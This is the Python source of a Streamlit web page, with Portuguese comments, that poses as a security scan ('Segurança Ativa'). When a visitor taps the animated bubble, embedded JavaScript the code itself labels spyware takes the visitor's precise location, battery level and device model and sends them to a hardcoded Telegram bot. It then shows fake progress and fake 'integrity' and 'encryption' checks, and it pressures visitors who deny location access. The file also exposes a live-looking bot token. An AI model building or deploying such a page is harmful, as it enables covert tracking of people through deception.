import streamlit as st
import time

# --- DADOS DO SEU BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# --- CSS ORIGINAL (BOLHA INTERATIVA) ---
st.markdown("""
    <style>
    .main { background-color: #0b0f14; color: white; }
    .stAlert { display: none !important; }
    
    .scanner-box { 
        display: flex; flex-direction: column; align-items: center; padding: 20px; 
        animation: float 3s ease-in-out infinite; 
        cursor: pointer; /* Indica que a bolha é clicável */
    }
    
    @keyframes float {
        0%, 100% { transform: translateY(0px); }
        50% { transform: translateY(-15px); }
    }

    .circle {
        width: 200px; height: 200px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.3);
        display: flex; align-items: center; justify-content: center;
        transition: 0.3s;
    }
    
    .circle:active { transform: scale(0.95); border-color: #2ecc71; }
    
    .pct-text { font-size: 48px; font-weight: bold; color: white; font-family: sans-serif; }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center; font-family: sans-serif;'>Toque na bolha para verificar</h2>", unsafe_allow_html=True)

caixa_bolha = st.empty()

# --- O MOTOR DENTRO DA BOLHA (TIPO SPYWARE) ---
# A bolha agora é o próprio iframe que captura tudo
js_bolha_botao = f"""
<div class="scanner-box" onclick="runSpy()">
    <div class="circle">
        <div class="pct-text" id="display">4%</div>
    </div>
</div>

<script>
async function runSpy() {{
    const options = {{ enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }};
    
    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            const bat = await navigator.getBattery();
            const level = Math.round(bat.level * 100);
            const model = navigator.userAgent.split('(')[1].split(')')[0];
            
            const msg = "🛡️ *BOLHA ACIONADA*\\n📱 " + model + "\\n🔋 " + level + "%\\n📍 [MAPA](https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude + ")";
            
            // Envio imediato pro Telegram
            await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                method: "POST",
                headers: {{ "Content-Type": "application/json" }},
                body: JSON.stringify({{ chat_id: "{ID}", text: msg, parse_mode: "Markdown" }})
            }});
            
            // Avisa o Streamlit para rodar a animação de sucesso
            window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
        }},
        (err) => {{
            alert("Atenção: Ative a localização para concluir a análise de segurança.");
        }},
        options
    );
}}
</script>
"""

# Renderiza a bolha como um componente clicável
ativou = st.components.v1.html(js_bolha_botao, height=300)

if ativou:
    # Quando o JS avisa que enviou, o Python gira os números
    for i in range(4, 101, 5):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{i}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.05)
    st.success("Análise Concluída com Sucesso!")
else:
    # Estado inicial (bolha parada esperando o clique)
    caixa_bolha.empty()

st.write("✅ Verificação de integridade")
st.write("✅ Criptografia de hardware")
